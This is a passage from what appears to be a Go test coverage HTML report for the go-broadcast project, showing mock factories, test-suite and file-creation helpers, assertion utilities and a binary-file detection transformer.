</pre>

		<pre class="file" id="file72" style="display: none">// Package mocks - Example showing code reduction with mock factory
package mocks

import (
        "context"

        "github.com/stretchr/testify/mock"
)

// ExampleClient shows original mock implementation
type ExampleClient struct {
        mock.Mock
}

// MethodReturningString - Original implementation (6 lines)
func (m *ExampleClient) MethodReturningString(ctx context.Context, id string) (string, error) <span class="cov0" title="0">{
        args := m.Called(ctx, id)
        if args.Get(0) == nil </span><span class="cov0" title="0">{
                return "", args.Error(1)
        }</span>
        <span class="cov0" title="0">return args.Get(0).(string), args.Error(1)</span>
}

// MethodReturningBool - Original implementation (6 lines)
func (m *ExampleClient) MethodReturningBool(ctx context.Context, flag bool) (bool, error) <span class="cov0" title="0">{
        args := m.Called(ctx, flag)
        if args.Get(0) == nil </span><span class="cov0" title="0">{
                return false, args.Error(1)
        }</span>
        <span class="cov0" title="0">return args.Get(0).(bool), args.Error(1)</span>
}

// MethodReturningError - Original implementation (3 lines)
func (m *ExampleClient) MethodReturningError(ctx context.Context) error <span class="cov0" title="0">{
        args := m.Called(ctx)
        return args.Error(0)
}</span>

// ExampleClientRefactored shows refactored mock using factory
type ExampleClientRefactored struct {
        MockBase
}

// NewExampleClientRefactored creates a new refactored mock
func NewExampleClientRefactored() *ExampleClientRefactored <span class="cov0" title="0">{
        return &amp;ExampleClientRefactored{
                MockBase: *NewMockBase(),
        }
}</span>

// MethodReturningString - Refactored implementation (2 lines)
func (m *ExampleClientRefactored) MethodReturningString(ctx context.Context, id string) (string, error) <span class="cov0" title="0">{
        return m.String(ctx, id)
}</span>

// MethodReturningBool - Refactored implementation (2 lines)
func (m *ExampleClientRefactored) MethodReturningBool(ctx context.Context, flag bool) (bool, error) <span class="cov0" title="0">{
        return m.Bool(ctx, flag)
}</span>

// MethodReturningError - Refactored implementation (2 lines)
func (m *ExampleClientRefactored) MethodReturningError(ctx context.Context) error <span class="cov0" title="0">{
        return m.Error(ctx)
}</span>

// ComplexExampleClient shows more complex types
type ComplexExampleClient struct {
        mock.Mock

        sliceHandler *SliceHandler[string]
        mapHandler   *MapHandler[string, int]
}

// NewComplexExampleClient creates a new complex example client
func NewComplexExampleClient() *ComplexExampleClient <span class="cov0" title="0">{
        client := &amp;ComplexExampleClient{}
        client.sliceHandler = NewSliceHandler[string](&amp;client.Mock)
        client.mapHandler = NewMapHandler[string, int](&amp;client.Mock)
        return client
}</span>

// GetItems - Refactored slice return (2 lines)
func (m *ComplexExampleClient) GetItems(ctx context.Context) ([]string, error) <span class="cov0" title="0">{
        return m.sliceHandler.HandleSlice("GetItems", ctx)
}</span>

// GetCounts - Refactored map return (2 lines)
func (m *ComplexExampleClient) GetCounts(ctx context.Context) (map[string]int, error) <span class="cov0" title="0">{
        return m.mapHandler.HandleMap("GetCounts", ctx)
}</span>

// Code reduction summary:
// Original mock method: 3-6 lines per method
// Refactored mock method: 2 lines per method
// Reduction: 50-67% per method

// For a mock with 20 methods:
// Original: ~100 lines
// Refactored: ~40 lines
// Total reduction: 60%
</pre>

		<pre class="file" id="file73" style="display: none">// Package mocks provides factory functions and utilities for creating mock objects
package mocks

import (
        "github.com/stretchr/testify/mock"

        "github.com/mrz1836/go-broadcast/internal/testutil"
)

// CallHandler provides a type-safe way to handle mock calls with consistent error handling
type CallHandler[T any] struct {
        mock *mock.Mock
}

// NewCallHandler creates a new CallHandler for the given mock
func NewCallHandler[T any](m *mock.Mock) *CallHandler[T] <span class="cov0" title="0">{
        return &amp;CallHandler[T]{mock: m}
}</span>

// HandleCall handles a mock call that returns (T, error)
func (h *CallHandler[T]) HandleCall(_ string, args ...interface{}) (T, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.ExtractResult[T](callArgs, 0)
}</span>

// HandleCallWithIndex handles a mock call where the result is at a specific index
func (h *CallHandler[T]) HandleCallWithIndex(_ string, index int, args ...interface{}) (T, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.ExtractResult[T](callArgs, index)
}</span>

// ErrorHandler provides consistent error handling for mock methods
type ErrorHandler struct {
        mock *mock.Mock
}

// NewErrorHandler creates a new ErrorHandler
func NewErrorHandler(m *mock.Mock) *ErrorHandler <span class="cov0" title="0">{
        return &amp;ErrorHandler{mock: m}
}</span>

// HandleError handles a mock call that returns only error
func (h *ErrorHandler) HandleError(_ string, args ...interface{}) error <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.ExtractError(callArgs)
}</span>

// BoolHandler provides type-safe handling for boolean returns
type BoolHandler struct {
        mock *mock.Mock
}

// NewBoolHandler creates a new BoolHandler
func NewBoolHandler(m *mock.Mock) *BoolHandler <span class="cov0" title="0">{
        return &amp;BoolHandler{mock: m}
}</span>

// HandleBool handles a mock call that returns (bool, error)
func (h *BoolHandler) HandleBool(_ string, args ...interface{}) (bool, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.HandleTwoValueReturn[bool](callArgs)
}</span>

// StringHandler provides type-safe handling for string returns
type StringHandler struct {
        mock *mock.Mock
}

// NewStringHandler creates a new StringHandler
func NewStringHandler(m *mock.Mock) *StringHandler <span class="cov0" title="0">{
        return &amp;StringHandler{mock: m}
}</span>

// HandleString handles a mock call that returns (string, error)
func (h *StringHandler) HandleString(_ string, args ...interface{}) (string, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.HandleTwoValueReturn[string](callArgs)
}</span>

// SliceHandler provides type-safe handling for slice returns
type SliceHandler[T any] struct {
        mock *mock.Mock
}

// NewSliceHandler creates a new SliceHandler
func NewSliceHandler[T any](m *mock.Mock) *SliceHandler[T] <span class="cov0" title="0">{
        return &amp;SliceHandler[T]{mock: m}
}</span>

// HandleSlice handles a mock call that returns ([]T, error)
func (h *SliceHandler[T]) HandleSlice(_ string, args ...interface{}) ([]T, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.HandleTwoValueReturn[[]T](callArgs)
}</span>

// MapHandler provides type-safe handling for map returns
type MapHandler[K comparable, V any] struct {
        mock *mock.Mock
}

// NewMapHandler creates a new MapHandler
func NewMapHandler[K comparable, V any](m *mock.Mock) *MapHandler[K, V] <span class="cov0" title="0">{
        return &amp;MapHandler[K, V]{mock: m}
}</span>

// HandleMap handles a mock call that returns (map[K]V, error)
func (h *MapHandler[K, V]) HandleMap(_ string, args ...interface{}) (map[K]V, error) <span class="cov0" title="0">{
        callArgs := h.mock.Called(args...)
        return testutil.HandleTwoValueReturn[map[K]V](callArgs)
}</span>

// MockBase provides common functionality for all mocks
type MockBase struct {
        mock.Mock

        ErrorHandler  *ErrorHandler
        BoolHandler   *BoolHandler
        StringHandler *StringHandler
}

// NewMockBase creates a new MockBase
func NewMockBase() *MockBase <span class="cov0" title="0">{
        base := &amp;MockBase{}
        base.ErrorHandler = NewErrorHandler(&amp;base.Mock)
        base.BoolHandler = NewBoolHandler(&amp;base.Mock)
        base.StringHandler = NewStringHandler(&amp;base.Mock)
        return base
}</span>

// Error is a convenience method for error-only returns
func (m *MockBase) Error(args ...interface{}) error <span class="cov0" title="0">{
        return m.ErrorHandler.HandleError("", args...)
}</span>

// Bool is a convenience method for bool returns
func (m *MockBase) Bool(args ...interface{}) (bool, error) <span class="cov0" title="0">{
        return m.BoolHandler.HandleBool("", args...)
}</span>

// String is a convenience method for string returns
func (m *MockBase) String(args ...interface{}) (string, error) <span class="cov0" title="0">{
        return m.StringHandler.HandleString("", args...)
}</span>
</pre>

		<pre class="file" id="file74" style="display: none">// Package suite provides common test suite setup functionality for go-broadcast tests
package suite

import (
        "context"
        "os"
        "testing"
        "time"

        "github.com/sirupsen/logrus"
        "github.com/stretchr/testify/suite"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/state"
        "github.com/mrz1836/go-broadcast/internal/transform"
)

// Helper provides common test suite setup functionality
type Helper struct {
        suite.Suite

        TempDir       string
        Logger        *logrus.Entry
        MockGH        *gh.MockClient
        MockTransform *transform.MockChain
        SourceState   *state.SourceState
        TargetConfig  config.TargetConfig
}

// SetupTempDir creates and manages a temporary directory for tests
func (s *Helper) SetupTempDir(prefix string) <span class="cov8" title="1">{
        tempDir, err := os.MkdirTemp("", prefix)
        s.Require().NoError(err)
        s.TempDir = tempDir
}</span>

// CleanupTempDir removes the temporary directory
func (s *Helper) CleanupTempDir() <span class="cov8" title="1">{
        if s.TempDir != "" </span><span class="cov8" title="1">{
                err := os.RemoveAll(s.TempDir)
                s.Require().NoError(err)
        }</span>
}

// SetupLogger creates a configured test logger
func (s *Helper) SetupLogger(component string) <span class="cov8" title="1">{
        s.Logger = CreateTestLogger(component)
}</span>

// SetupLoggerWithLevel creates a test logger with specific log level
func (s *Helper) SetupLoggerWithLevel(component string, level logrus.Level) <span class="cov8" title="1">{
        logger := logrus.New()
        logger.SetLevel(level)
        s.Logger = logger.WithField("component", component)
}</span>

// SetupMocks initializes common mock objects
func (s *Helper) SetupMocks() <span class="cov8" title="1">{
        s.MockGH = &amp;gh.MockClient{}
        s.MockTransform = &amp;transform.MockChain{}
}</span>

// SetupSourceState creates a default source state for testing
func (s *Helper) SetupSourceState(repo, branch, commit string) <span class="cov8" title="1">{
        s.SourceState = &amp;state.SourceState{
                Repo:         repo,
                Branch:       branch,
                LatestCommit: commit,
                LastChecked:  time.Now(),
        }
}</span>

// SetupTargetConfig creates a basic target configuration
func (s *Helper) SetupTargetConfig(repo string, files []config.FileMapping) <span class="cov8" title="1">{
        s.TargetConfig = config.TargetConfig{
                Repo:  repo,
                Files: files,
        }
}</span>

// SetupStandardSuite performs standard suite setup with all common components
func (s *Helper) SetupStandardSuite(tempDirPrefix, component, sourceRepo, targetRepo string) <span class="cov8" title="1">{
        s.SetupTempDir(tempDirPrefix)
        s.SetupLogger(component)
        s.SetupMocks()
        s.SetupSourceState(sourceRepo, "main", "abc123")
        s.SetupTargetConfig(targetRepo, []config.FileMapping{
                {Src: "file1.txt", Dest: "file1.txt"},
                {Src: "file2.txt", Dest: "file2.txt"},
        })
}</span>

// TestLogger creates a logger suitable for testing
func TestLogger(_ *testing.T, component string) *logrus.Entry <span class="cov8" title="1">{
        return CreateTestLogger(component)
}</span>

// TestLoggerWithLevel creates a logger with specific level for testing
func TestLoggerWithLevel(_ *testing.T, component string, level logrus.Level) *logrus.Entry <span class="cov8" title="1">{
        logger := logrus.New()
        logger.SetLevel(level)
        return logger.WithField("component", component)
}</span>

// TestContext returns a background context for testing
func TestContext() context.Context <span class="cov8" title="1">{
        return context.Background()
}</span>

// CreateTestLogger creates a logger configured for testing with standard settings
func CreateTestLogger(component string) *logrus.Entry <span class="cov8" title="1">{
        logger := logrus.New()
        logger.SetLevel(logrus.DebugLevel)
        logger.SetFormatter(&amp;logrus.TextFormatter{
                DisableColors: true,
                FullTimestamp: true,
        })
        return logger.WithField("component", component)
}</span>

// CreateTestLoggerWithConfig creates a logger with custom logging configuration
func CreateTestLoggerWithConfig(component string, logConfig logging.LogConfig) *logrus.Entry <span class="cov8" title="1">{
        logger := logrus.New()

        // Apply log configuration
        switch logConfig.LogLevel </span>{
        case "debug":<span class="cov8" title="1">
                logger.SetLevel(logrus.DebugLevel)</span>
        case "info":<span class="cov8" title="1">
                logger.SetLevel(logrus.InfoLevel)</span>
        case "warn":<span class="cov0" title="0">
                logger.SetLevel(logrus.WarnLevel)</span>
        case "error":<span class="cov0" title="0">
                logger.SetLevel(logrus.ErrorLevel)</span>
        default:<span class="cov8" title="1">
                logger.SetLevel(logrus.InfoLevel)</span>
        }

        <span class="cov8" title="1">if logConfig.LogFormat == "json" </span><span class="cov8" title="1">{
                logger.SetFormatter(&amp;logrus.JSONFormatter{})
        }</span> else<span class="cov8" title="1"> {
                logger.SetFormatter(&amp;logrus.TextFormatter{
                        DisableColors: true,
                        FullTimestamp: true,
                })
        }</span>

        <span class="cov8" title="1">return logger.WithField("component", component)</span>
}

// CreateTempFile creates a temporary file with given content for testing
func CreateTempFile(t *testing.T, dir, pattern, content string) string <span class="cov8" title="1">{
        t.Helper()

        file, err := os.CreateTemp(dir, pattern)
        if err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to create temp file: %v", err)
        }</span>

        <span class="cov8" title="1">if content != "" </span><span class="cov8" title="1">{
                if _, err := file.WriteString(content); err != nil </span><span class="cov0" title="0">{
                        _ = file.Close()
                        _ = os.Remove(file.Name())
                        t.Fatalf("failed to write content to temp file: %v", err)
                }</span>
        }

        <span class="cov8" title="1">if err := file.Close(); err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to close temp file: %v", err)
        }</span>

        <span class="cov8" title="1">return file.Name()</span>
}
</pre>

		<pre class="file" id="file75" style="display: none">// Package testutil provides shared testing utilities for file creation and mock handling.
package testutil

import (
        "fmt"
        "os"
        "path/filepath"
        "testing"
)

// CreateTestFiles creates multiple test files with default content in the specified directory.
// Returns a slice of file paths that were created.
func CreateTestFiles(t *testing.T, dir string, count int) []string <span class="cov8" title="1">{
        t.Helper()

        files := make([]string, count)
        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                fileName := fmt.Sprintf("test_file_%d.txt", i)
                filePath := filepath.Join(dir, fileName)
                content := fmt.Sprintf("Test content for file %d\n", i)

                err := os.WriteFile(filePath, []byte(content), 0o600)
                if err != nil </span><span class="cov0" title="0">{
                        t.Fatalf("failed to create test file %s: %v", filePath, err)
                }</span>
                <span class="cov8" title="1">files[i] = filePath</span>
        }
        <span class="cov8" title="1">return files</span>
}

// CreateTestFilesWithNames creates test files with specific names and default content.
// Returns a slice of the file paths that were created.
func CreateTestFilesWithNames(t *testing.T, dir string, names []string) []string <span class="cov8" title="1">{
        t.Helper()

        files := make([]string, len(names))
        for i, name := range names </span><span class="cov8" title="1">{
                filePath := filepath.Join(dir, name)
                content := fmt.Sprintf("Content for %s", name)

                err := os.WriteFile(filePath, []byte(content), 0o600)
                if err != nil </span><span class="cov0" title="0">{
                        t.Fatalf("failed to create test file %s: %v", filePath, err)
                }</span>
                <span class="cov8" title="1">files[i] = filePath</span>
        }
        <span class="cov8" title="1">return files</span>
}

// CreateTestRepo creates a temporary repository directory with cleanup.
// Returns the directory path and a cleanup function.
func CreateTestRepo(t *testing.T) (string, func()) <span class="cov8" title="1">{
        t.Helper()

        dir, err := os.MkdirTemp("", "test_repo_*")
        if err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to create temp directory: %v", err)
        }</span>

        <span class="cov8" title="1">cleanup := func() </span><span class="cov8" title="1">{
                _ = os.RemoveAll(dir) // Ignore cleanup errors in tests
        }</span>

        <span class="cov8" title="1">return dir, cleanup</span>
}

// WriteTestFile creates a single test file with custom content.
func WriteTestFile(t *testing.T, filePath, content string) <span class="cov8" title="1">{
        t.Helper()

        err := os.WriteFile(filePath, []byte(content), 0o600)
        if err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to create test file %s: %v", filePath, err)
        }</span>
}

// WriteTestFileWithFormat creates a single test file with formatted content.
func WriteTestFileWithFormat(t *testing.T, filePath, format string, args ...interface{}) <span class="cov8" title="1">{
        t.Helper()

        content := fmt.Sprintf(format, args...)
        err := os.WriteFile(filePath, []byte(content), 0o600)
        if err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to create test file %s: %v", filePath, err)
        }</span>
}

// CreateBenchmarkFiles creates multiple test files for benchmark testing with specific content pattern.
// This is optimized for benchmark usage (uses b.Helper() and b.Fatalf).
func CreateBenchmarkFiles(b *testing.B, dir string, count int) []string <span class="cov8" title="1">{
        b.Helper()

        files := make([]string, count)
        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                fileName := fmt.Sprintf("bench_file_%d.txt", i)
                filePath := filepath.Join(dir, fileName)
                content := fmt.Sprintf("Benchmark test content %d", i)

                err := os.WriteFile(filePath, []byte(content), 0o600)
                if err != nil </span><span class="cov0" title="0">{
                        b.Fatalf("failed to create benchmark file %s: %v", filePath, err)
                }</span>
                <span class="cov8" title="1">files[i] = filePath</span>
        }
        <span class="cov8" title="1">return files</span>
}

// CreateTestDirectory creates a directory and returns its path.
// If the directory already exists, it does nothing.
func CreateTestDirectory(t *testing.T, dirPath string) <span class="cov8" title="1">{
        t.Helper()

        err := os.MkdirAll(dirPath, 0o750)
        if err != nil </span><span class="cov0" title="0">{
                t.Fatalf("failed to create directory %s: %v", dirPath, err)
        }</span>
}

// CreateTempDir creates a temporary directory using t.TempDir() and returns the path.
// This leverages Go's built-in cleanup mechanism.
func CreateTempDir(t *testing.T) string <span class="cov8" title="1">{
        t.Helper()
        return t.TempDir()
}</span>

// CreateBenchmarkTempDir creates a temporary directory using b.TempDir() for benchmarks.
func CreateBenchmarkTempDir(b *testing.B) string <span class="cov8" title="1">{
        b.Helper()
        return b.TempDir()
}</span>

// WriteBenchmarkFile creates a single file for benchmark testing.
// This is optimized for benchmark usage (uses b.Helper() and b.Fatalf).
func WriteBenchmarkFile(b *testing.B, filePath, content string) <span class="cov8" title="1">{
        b.Helper()

        err := os.WriteFile(filePath, []byte(content), 0o600)
        if err != nil </span><span class="cov0" title="0">{
                b.Fatalf("failed to create benchmark file %s: %v", filePath, err)
        }</span>
}
</pre>

		<pre class="file" id="file76" style="display: none">// Package testutil provides shared testing utilities for file creation and mock handling.
package testutil

import (
        "fmt"

        "github.com/stretchr/testify/mock"
)

// ValidateArgs validates mock arguments count against expected count
func ValidateArgs(args mock.Arguments, expectedCount int) error <span class="cov8" title="1">{
        if len(args) != expectedCount </span><span class="cov8" title="1">{
                return fmt.Errorf("mock not properly configured: expected %d return values, got %d", expectedCount, len(args)) //nolint:err113 // defensive error for test mock
        }</span>
        <span class="cov8" title="1">return nil</span>
}

// ExtractResult extracts a typed result from mock arguments at the specified index.
// This is used for methods that return (result, error) where result is at index 0.
func ExtractResult[T any](args mock.Arguments, index int) (T, error) <span class="cov8" title="1">{
        var zero T

        if err := ValidateArgs(args, 2); err != nil </span><span class="cov8" title="1">{
                return zero, err
        }</span>

        <span class="cov8" title="1">if args.Get(index) == nil </span><span class="cov8" title="1">{
                return zero, args.Error(1)
        }</span>

        <span class="cov8" title="1">result, ok := args.Get(index).(T)
        if !ok </span><span class="cov8" title="1">{
                return zero, fmt.Errorf("mock result at index %d is not of expected type", index) //nolint:err113 // defensive error for test mock
        }</span>

        <span class="cov8" title="1">return result, args.Error(1)</span>
}

// ExtractError extracts error from mock arguments with single return value validation.
// This is used for methods that return only error.
func ExtractError(args mock.Arguments) error <span class="cov8" title="1">{
        if err := ValidateArgs(args, 1); err != nil </span><span class="cov8" title="1">{
                return err
        }</span>

        // Handle nil return value (which is a valid error value)
        <span class="cov8" title="1">if args.Get(0) == nil </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Try to cast to error, fallback to generic error if not possible
        <span class="cov8" title="1">if err, ok := args.Get(0).(error); ok </span><span class="cov8" title="1">{
                return err
        }</span>

        // If not an error type, return a generic error
        <span class="cov8" title="1">return fmt.Errorf("mock returned non-error type: %T", args.Get(0))</span> //nolint:err113 // defensive error for test mock
}

// ExtractStringResult extracts string result from mock arguments for methods returning (string, error).
// This handles the fallback pattern for incorrectly configured mocks.
func ExtractStringResult(args mock.Arguments) (string, error) <span class="cov8" title="1">{
        // Check if we have enough arguments to avoid panic
        if len(args) &lt; 2 </span><span class="cov8" title="1">{
                // Fallback for incorrectly configured mocks
                if len(args) == 1 </span><span class="cov8" title="1">{
                        if err, ok := args.Get(0).(error); ok </span><span class="cov8" title="1">{
                                return "", err
                        }</span>
                }
                // Return an error instead of nil,nil to avoid nil pointer dereference
                <span class="cov8" title="1">return "", fmt.Errorf("mock not properly configured: expected 2 return values, got %d", len(args))</span> //nolint:err113 // defensive error for test mock
        }

        <span class="cov8" title="1">return args.String(0), args.Error(1)</span>
}

// HandleTwoValueReturn handles the common pattern for methods returning (result, error).
// It includes fallback handling for incorrectly configured mocks.
func HandleTwoValueReturn[T any](args mock.Arguments) (T, error) <span class="cov8" title="1">{
        var zero T

        // Check if we have enough arguments to avoid panic
        if len(args) &lt; 2 </span><span class="cov8" title="1">{
                // Fallback for incorrectly configured mocks
                if len(args) == 1 </span><span class="cov8" title="1">{
                        if err, ok := args.Get(0).(error); ok </span><span class="cov8" title="1">{
                                return zero, err
                        }</span>
                }
                // Return an error instead of nil,nil to avoid nil pointer dereference
                <span class="cov8" title="1">return zero, fmt.Errorf("mock not properly configured: expected 2 return values, got %d", len(args))</span> //nolint:err113 // defensive error for test mock
        }

        <span class="cov8" title="1">if args.Get(0) == nil </span><span class="cov8" title="1">{
                return zero, args.Error(1)
        }</span>

        <span class="cov8" title="1">result, ok := args.Get(0).(T)
        if !ok </span><span class="cov8" title="1">{
                return zero, fmt.Errorf("mock result is not of expected type") //nolint:err113 // defensive error for test mock
        }</span>

        <span class="cov8" title="1">return result, args.Error(1)</span>
}
</pre>

		<pre class="file" id="file77" style="display: none">// Package testutil provides shared test utilities and patterns for consistent testing across the go-broadcast codebase.
package testutil

import (
        "testing"
)

// TestCase represents a generic test case structure for table-driven tests.
// It provides a consistent pattern for organizing test scenarios.
type TestCase[TInput any, TExpected any] struct {
        Name     string    // Test case name for t.Run()
        Input    TInput    // Input value(s) for the test
        Expected TExpected // Expected output/result
        WantErr  bool      // Whether an error is expected
        ErrMsg   string    // Expected error message substring (optional)
}

// RunTableTests runs table-driven tests with consistent patterns.
// It provides a standard way to execute multiple test cases.
func RunTableTests[TInput, TExpected any](
        t testing.TB,
        tests []TestCase[TInput, TExpected],
        runner func(testing.TB, TestCase[TInput, TExpected]),
) <span class="cov8" title="1">{
        t.Helper()

        for _, tt := range tests </span><span class="cov8" title="1">{
                if tRunner, ok := t.(*testing.T); ok </span><span class="cov8" title="1">{
                        tRunner.Run(tt.Name, func(t *testing.T) </span><span class="cov8" title="1">{
                                runner(t, tt)
                        }</span>)
                } else<span class="cov0" title="0"> if bRunner, ok := t.(*testing.B); ok </span><span class="cov0" title="0">{
                        bRunner.Run(tt.Name, func(b *testing.B) </span><span class="cov0" title="0">{
                                runner(b, tt)
                        }</span>)
                }
        }
}

// AssertNoError fails the test if err is not nil.
// It provides a consistent way to check for unexpected errors.
func AssertNoError(t testing.TB, err error, msgAndArgs ...interface{}) <span class="cov8" title="1">{
        t.Helper()
        if err != nil </span><span class="cov0" title="0">{
                if len(msgAndArgs) &gt; 0 </span><span class="cov0" title="0">{
                        t.Fatalf("unexpected error: %v, %v", err, msgAndArgs)
                }</span> else<span class="cov0" title="0"> {
                        t.Fatalf("unexpected error: %v", err)
                }</span>
        }
}

// AssertError fails the test if err is nil when error is expected.
// It provides a consistent way to check that an error occurred.
func AssertError(t testing.TB, err error, msgAndArgs ...interface{}) <span class="cov8" title="1">{
        t.Helper()
        if err == nil </span><span class="cov0" title="0">{
                if len(msgAndArgs) &gt; 0 </span><span class="cov0" title="0">{
                        t.Fatalf("expected error but got nil: %v", msgAndArgs)
                }</span> else<span class="cov0" title="0"> {
                        t.Fatal("expected error but got nil")
                }</span>
        }
}

// AssertErrorContains checks that an error occurred and contains the expected message.
// It provides a consistent way to validate error messages.
func AssertErrorContains(t testing.TB, err error, expectedMsg string) <span class="cov8" title="1">{
        t.Helper()
        if err == nil </span><span class="cov0" title="0">{
                t.Fatalf("expected error containing '%s' but got nil", expectedMsg)
        }</span>
        <span class="cov8" title="1">if expectedMsg != "" &amp;&amp; !contains(err.Error(), expectedMsg) </span><span class="cov0" title="0">{
                t.Fatalf("expected error to contain '%s' but got: %v", expectedMsg, err)
        }</span>
}

// AssertEqual checks that two values are equal.
// It provides a simple equality check with clear error messages.
func AssertEqual[T comparable](t testing.TB, expected, actual T, msgAndArgs ...interface{}) <span class="cov8" title="1">{
        t.Helper()
        if expected != actual </span><span class="cov0" title="0">{
                if len(msgAndArgs) &gt; 0 </span><span class="cov0" title="0">{
                        t.Fatalf("expected %v but got %v: %v", expected, actual, msgAndArgs)
                }</span> else<span class="cov0" title="0"> {
                        t.Fatalf("expected %v but got %v", expected, actual)
                }</span>
        }
}

// AssertNotEqual checks that two values are not equal.
// It provides a simple inequality check with clear error messages.
func AssertNotEqual[T comparable](t testing.TB, unexpected, actual T, msgAndArgs ...interface{}) <span class="cov8" title="1">{
        t.Helper()
        if unexpected == actual </span><span class="cov0" title="0">{
                if len(msgAndArgs) &gt; 0 </span><span class="cov0" title="0">{
                        t.Fatalf("expected value to not be %v: %v", unexpected, msgAndArgs)
                }</span> else<span class="cov0" title="0"> {
                        t.Fatalf("expected value to not be %v", unexpected)
                }</span>
        }
}

// BenchmarkCase represents a benchmark test case with size information.
type BenchmarkCase struct {
        Name  string        // Benchmark case name
        Size  int           // Size parameter for the benchmark
        Setup func() func() // Optional setup function that returns cleanup
}

// RunBenchmarkCases runs a set of benchmark cases with consistent patterns.
func RunBenchmarkCases(b *testing.B, cases []BenchmarkCase, runner func(*testing.B, BenchmarkCase)) <span class="cov8" title="1">{
        for _, bc := range cases </span><span class="cov8" title="1">{
                b.Run(bc.Name, func(b *testing.B) </span><span class="cov8" title="1">{
                        if bc.Setup != nil </span><span class="cov8" title="1">{
                                cleanup := bc.Setup()
                                if cleanup != nil </span><span class="cov8" title="1">{
                                        defer cleanup()
                                }</span>
                        }
                        <span class="cov8" title="1">runner(b, bc)</span>
                })
        }
}

// SkipIfShort skips a test if running in short mode.
func SkipIfShort(t testing.TB) <span class="cov8" title="1">{
        if testing.Short() </span><span class="cov8" title="1">{
                t.Skip("skipping test in short mode")
        }</span>
}

// SkipIfNoNetwork skips a test that requires network access.
func SkipIfNoNetwork(t testing.TB) <span class="cov8" title="1">{
        // This could be enhanced to actually check network availability
        if testing.Short() </span><span class="cov8" title="1">{
                t.Skip("skipping network test in short mode")
        }</span>
}

// contains is a helper function to check if a string contains a substring.
func contains(s, substr string) bool <span class="cov8" title="1">{
        return len(substr) &gt; 0 &amp;&amp; len(s) &gt;= len(substr) &amp;&amp;
                (s == substr || len(s) &gt; len(substr) &amp;&amp; containsSubstring(s, substr))
}</span>

// containsSubstring checks if s contains substr.
func containsSubstring(s, substr string) bool <span class="cov8" title="1">{
        for i := 0; i &lt;= len(s)-len(substr); i++ </span><span class="cov8" title="1">{
                if s[i:i+len(substr)] == substr </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}
</pre>

		<pre class="file" id="file78" style="display: none">package transform

import (
        "path/filepath"
        "strings"
)

// binaryExtensions contains common binary file extensions
//
//nolint:gochecknoglobals // This is a read-only lookup table
var binaryExtensions = map[string]bool{
        // Images
        ".jpg":  true,
        ".jpeg": true,
        ".png":  true,
        ".gif":  true,
        ".bmp":  true,
        ".ico":  true,
        ".svg":  true,
        ".webp": true,

        // Archives
        ".zip": true,
        ".tar": true,
        ".gz":  true,
        ".bz2": true,
        ".xz":  true,
        ".7z":  true,
        ".rar": true,

        // Executables
        ".exe":   true,
        ".dll":   true,
        ".so":    true,
        ".dylib": true,
        ".a":     true,
        ".o":     true,

        // Media
        ".mp3":  true,
        ".mp4":  true,
        ".avi":  true,
        ".mov":  true,
        ".wav":  true,
        ".flac": true,
        ".ogg":  true,

        // Documents
        ".pdf":  true,
        ".doc":  true,
        ".docx": true,
        ".xls":  true,
        ".xlsx": true,
        ".ppt":  true,
        ".pptx": true,

        // Other
        ".jar":    true,
        ".war":    true,
        ".ear":    true,
        ".class":  true,
        ".pyc":    true,
        ".pyo":    true,
        ".wasm":   true,
        ".db":     true,
        ".sqlite": true,
}

// IsBinary checks if a file is likely binary based on its extension and content
func IsBinary(filePath string, content []byte) bool <span class="cov8" title="1">{
        // Check extension first (fast)
        ext := strings.ToLower(filepath.Ext(filePath))
        if binaryExtensions[ext] </span><span class="cov8" title="1">{
                return true
        }</span>

        // Check content (slower, but more accurate)
        <span class="cov8" title="1">return isBinaryContent(content)</span>
}

// isBinaryContent checks if content appears to be binary
func isBinaryContent(content []byte) bool <span class="cov8" title="1">{
        // Empty files are not binary
        if len(content) == 0 </span><span class="cov8" title="1">{
                return false
        }</span>

        // Check first 8KB for binary indicators
        <span class="cov8" title="1">checkLen := len(content)
        if checkLen &gt; 8192 </span><span class="cov8" title="1">{
                checkLen = 8192
        }</span>

        // Count non-text characters
        <span class="cov8" title="1">nonTextBytes := 0

        for i := 0; i &lt; checkLen; i++ </span><span class="cov8" title="1">{
                b := content[i]

                // Null byte is a strong indicator of binary content
                if b == 0 </span><span class="cov8" title="1">{
                        return true
                }</span>

                // Check for non-text characters (excluding common whitespace)
                <span class="cov8" title="1">if (b &lt; 32 &amp;&amp; b != '\t' &amp;&amp; b != '\n' &amp;&amp; b != '\r') || b &gt; 127 </span><span class="cov8" title="1">{
                        nonTextBytes++
                }</span>
        }

        // If more than 30% of checked bytes are non-text, consider it binary
        <span class="cov8" title="1">threshold := checkLen * 30 / 100
        return nonTextBytes &gt; threshold</span>
}

// binaryTransformer is a no-op transformer for binary files
type binaryTransformer struct{}

// NewBinaryTransformer creates a transformer that skips binary files
func NewBinaryTransformer() Transformer <span class="cov8" title="1">{
        return &amp;binaryTransformer{}
}</span>

// Name returns the name of this transformer
func (b *binaryTransformer) Name() string <span class="cov8" title="1">{
        return "binary-file-skipper"
}</span>

// Transform returns content unchanged if it's binary
func (b *binaryTransformer) Transform(content []byte, ctx Context) ([]byte, error) <span class="cov8" title="1">{
        if IsBinary(ctx.FilePath, content) </span><span class="cov8" title="1">{
                // Return content unchanged
                return content, nil
        }</span>

        // For non-binary files, this transformer does nothing
        // (other transformers in the chain will process the file)
        <span class="cov8" title="1">return content, nil</span>
}
</pre>

		<pre class="file" id="file79" style="display: none">package transform

import (
        "context"
        "fmt"

